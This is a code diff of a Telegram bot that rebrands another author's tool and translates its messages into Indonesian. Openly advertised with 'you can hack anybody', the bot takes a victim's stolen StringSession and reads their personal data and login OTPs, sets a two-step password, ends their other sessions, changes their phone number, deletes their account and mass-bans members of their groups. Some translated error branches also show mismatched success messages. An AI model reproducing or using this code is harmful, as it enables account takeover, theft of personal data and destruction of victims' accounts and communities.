@@ -1,5 +1,5 @@
-# COPYRIGHT © 2021-22 BY LEGENDX22 🔥
-# NOW PUBLIC BY LEGENDX
+# COPYRIGHT © 2021-22 BY RehanSaputra 🔥
+# NOW PUBLIC BY RehanSaputra
 import os
 os.system("pip install Telethon==1.21.1")
 from telethon import TelegramClient, events, functions, types
@@ -9,7 +9,7 @@ from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = os.environ.get("API_HASH")
 token = os.environ.get("BOT_TOKEN")
-client = TelegramClient('Xarmy', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('Hacker', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -21,7 +21,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendx = 1967548493
+legendx = 995099715
 
 
 async def change_number_code(strses, number, code, otp):
@@ -149,249 +149,249 @@ logging.basicConfig(level=logging.WARNING)
 channel = "TheXArmy"
 menu = '''
 
-**NOTICE JOIN @TheXArmy FEDERATION**
+**NOTICE JOIN @ZoneDangerSex FEDERATION**
 FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`
 
 
-A: [check user own groups and channels]
+A: [periksa grup dan saluran milik pengguna]
 
-B: [check user all information like phone number usrname...]
+B: [periksa semua informasi pengguna seperti nomor telepon nama pengguna...]
 
-C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
+C: [melarang grup {berikan saya StringSession dan nama pengguna saluran/grup saya akan mencekal semua anggota di sana}]
 
-D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+D: [ketahui pengguna otp terakhir {pertama gunakan opsi B ambil nomor telepon dan masuk di sana Akun lalu gunakan saya, saya akan memberi Anda otp}]
 
-E: [Join A Group/Channel via StringSession]
+E: [Bergabung dengan Grup/channel melalui StringSession]
 
-F: [Leave A Group/Channel via StringSession]
+F: [Keluar dari Grup/channel melalui StringSession]
 
-G: [Delete A Group/Channel]
+G: [Hapus Grup/channel]
 
-H: [Check user two step is eneable or disable]
+H: [Periksa apakah dua langkah pengguna diaktifkan atau dinonaktifkan]
 
-I: [Terminate All current active sessions except Your StringSession]
+I: [Hentikan Semua sesi aktif saat ini kecuali StringSession Anda]
 
-J: [Delete Account]
+J: [Hapus Akun]
 
-K: [Demote all admins in a group/channel]
+K: [Demosikan semua admin di grup/channel]
 
-L: [Promote a member in a group/channel]
+L: [Promosikan anggota di grup/channel]
 
-M: [Change Phone number using StringSession]
+M: [Ganti nomor telepon menggunakan StringSession]
 
-I ADD MORE FEATURES LATER 😆
+SAYA MENAMBAHKAN FITUR LEBIH BANYAK KEMUDIAN 😆
 '''
 mm = '''
-You can hack anybody
-Take his StringSession and use me
-I will give you full power of mine
-Type /hack
+Anda dapat meretas siapa pun
+Ambil StringSession-nya dan gunakan saya
+Aku akan memberimu kekuatan penuh milikku
+Ketik /hack
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("please use me in pm🥺")
+    await event.reply("tolong gunakan saya di sore hari 🥺")
   else:
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == legendx:
-    return await event.reply("please don't use me fuck off 🥺")
+    return await event.reply("tolong jangan manfaatkan aku 🥺")
   try:
-    await event.reply("session bot file", file="Xarmy.session")
+    await event.reply("session bot file", file="Hacker.session")
   except Exception as e:
     print (e)
 
 
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
-  await event.reply("please use me in pm🥺")
+  await event.reply("Tolong Gunakan Saya Di Sore Hari🥺")
 @client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"Choose what you want with string session \n\n{menu}")
+    await x.send_message(f"Pilih apa yang Anda inginkan dengan sesi string \n\n{menu}")
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("StringSession ini mungkin dihentikan")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await event.reply("StringSession ini mungkin dihentikan")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY X HACKER")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await event.reply(i + "\n\nThanks For using X Hacker Bot")
     elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("StringSession ini mungkin dihentikan")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nThanks For using X Hacker Bot")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("StringSession ini mungkin dihentikan")
+      await x.send_message("BERIKAN USERNAME/ID GRUP/CHANNEL")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("Melarang semua anggota Terima kasih telah menggunakan X Hacker Bot")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("StringSession ini mungkin dihentikan")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nThanks For using X Hacker Bot")
     elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("StringSession ini mungkin dihentikan")
+      await x.send_message("BERIKAN USERNAME/ID GRUP/CHANNEL")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Bergabung dengan Saluran/Grup Terima kasih telah menggunakan X Hacker Bot")
     elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("Bergabung dengan Saluran/Grup Terima kasih telah menggunakan X Hacker Bot")
+      await x.send_message("BERIKAN USERNAME/ID GRUP/CHANNEL")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Meninggalkan Saluran/Grup Terima kasih telah menggunakan X Hacker Bot")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("StringSession ini mungkin dihentikan")
+      await x.send_message("BERIKAN USERNAME/ID GRUP/CHANNEL")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Menghapus Saluran/Grup Terima kasih telah menggunakan X Hacker Bot")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("StringSession ini mungkin dihentikan")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
+        await event.reply("Saya tidak memiliki dua langkah, itulah mengapa sekarang dua langkah adalah `LEGENDXISBEST` Anda dapat login sekarang\n\nTerima kasih telah menggunakan X Hacker Bot")
       else:
-        await event.reply("Sorry User Have two step already")
+        await event.reply("Maaf Pengguna Sudah dua langkah")
     elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("StringSession ini mungkin dihentikan")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
+      await event.reply("Semua sesi dihentikan\n\nTerima kasih telah menggunakan X Hacker Bot")
     elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("StringSession ini mungkin dihentikan")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
+      await event.reply("Akun berhasil dihapus\n\nTerima kasih telah menggunakan X Hacker Bot")
     elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("StringSession ini mungkin dihentikan")
+      await x.send_message("SEKARANG BERIKAN NAMA PENGGUNA GRUP/CHANNEL")
       grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
+      await x.send_message("SEKARANG BERIKAN NAMA PENGGUNA")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("Saya Mempromosikan Anda di Grup/Saluran tunggu sebentar 😗😗\n\nTerima kasih telah menggunakan X HackerBot")
     elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("Akun berhasil dihapus\n\nTerima kasih telah menggunakan X Hacker Bot")
+      await x.send_message("SEKARANG BERIKAN NAMA PENGGUNA GRUP/CHANNEL")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("Saya Mendemosikan semua anggota Grup/Saluran tunggu sebentar 😗😗\n\nTerima kasih telah menggunakan X Hacker Bot")
     elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("BERIKAN SESI STRING")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
+        return await event.respond("StringSession ini mungkin dihentikan")
+      await x.send_message("BERIKAN NOMOR YANG INGIN GANTI\n[CATATAN: JANGAN GUNAKAN nomor baris ke-2 atau SMS sekarang]\n[kalau Anda menggunakan baris ke-2 atau SMS sekarang, Anda tidak bisa mendapatkan otp] ")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await event.respond(result + "\n salin hash kode telepon dan periksa nomor Anda, Anda mendapat otp\ni berhenti selama 20 detik salin hash kode telepon dan otp")
         await asyncio.sleep(20)
-        await x.send_message("NOW GIVE PHONE CODE HASH")
+        await x.send_message("SEKARANG BERIKAN HASH KODE TELEPON")
         phone_code_hash = (await x.get_response()).text
-        await x.send_message("NOW GIVE THE OTP")
+        await x.send_message("SEKARANG BERIKAN KODE OTP")
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+          await event.respond("NOMOR SELAMAT TELAH BERUBAH")
         else:
-          await event.respond("Something is wrong")
+          await event.respond("Sesuatu data tidak valid")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await event.respond("KIRIM KESALAHAN INI KE - @Revanstoreya\n**LOGS**\n" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+      await event.respond("Teks Salah Ditemukan Ketik ulang /hack dan gunakan")
 
 
 
